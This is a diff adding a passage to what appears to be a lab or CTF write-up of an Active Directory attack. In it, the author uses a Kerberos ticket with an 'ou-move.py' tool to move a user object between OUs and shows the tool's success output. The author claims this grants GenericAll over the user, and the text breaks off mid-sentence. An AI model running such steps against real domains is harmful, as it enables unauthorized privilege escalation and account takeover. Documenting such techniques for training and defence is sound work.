@@ -602,5 +602,30 @@ export KRB5CCNAME=caleb.turner.ccache
 Ill then export it
 
 ```python
+python3 ou-move.py -H ldap://dc.hsm-defense.local --kerberos --from-ou 'CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL' --to-ou 'OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL'
 
+  ___  _   _   __  __                   
+ / _ \| | | | |  \/  |                  
+| | | | | | | | |\/| | _____   _____    
+| |_| | |_| | | |  | |/ _ \ \ / / _ \  
+ \___/ \___/  |_|  |_|\___/\ V /  __/  
+                              \_/ \___|  
+  OU Move Tool — LDAP moddn
+
+[*] Connecting to dc.hsm-defense.local:389 (LDAP)
+[*] Binding via Kerberos (SASL GSSAPI) using existing ticket cache...
+[+] Bound via Kerberos as: u:HSMDEFENSE\caleb.turner
+
+[*] Verifying object exists: CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL
+[+] Object confirmed.
+
+[*] Source DN   : CN=OSCAR.MAZERATH,OU=IT-TIER1,DC=HSM-DEFENSE,DC=LOCAL
+[*] New RDN     : CN=OSCAR.MAZERATH
+[*] New superior: OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL
+
+[*] Executing moddn...
+[+] Success! Object moved.
+[+] New DN: CN=OSCAR.MAZERATH,OU=IT-TIER3,DC=HSM-DEFENSE,DC=LOCAL
 ```
+
+I have now moved the object, which should now mean i have GenericAll over the object, which means i can change the u
